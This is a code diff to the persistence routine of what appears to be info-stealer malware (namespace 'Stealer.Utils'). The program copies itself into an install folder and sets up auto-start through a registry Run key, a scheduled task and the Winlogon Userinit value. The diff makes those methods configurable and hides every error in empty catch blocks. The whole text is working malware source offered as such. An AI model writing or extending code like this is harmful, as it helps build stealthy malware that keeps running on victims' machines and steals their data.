@@ -17,6 +17,10 @@ namespace Stealer.Utils
         {
             try
             {
+                Config.Initialize();
+                string methods = Config.Persistence.ToLower();
+                if (string.IsNullOrEmpty(methods) || methods == "none") return;
+
                 if (!Directory.Exists(InstallDir))
                     Directory.CreateDirectory(InstallDir);
 
@@ -26,9 +30,9 @@ namespace Stealer.Utils
                     File.Copy(currentPath, InstallPath, true);
                 }
 
-                RegistryRun();
-                TaskScheduler();
-                Userinit();
+                if (methods.Contains("registry")) try { RegistryRun(); } catch { }
+                if (methods.Contains("scheduler")) try { TaskScheduler(); } catch { }
+                if (methods.Contains("userinit")) try { Userinit(); } catch { }
             }
             catch { }
         }
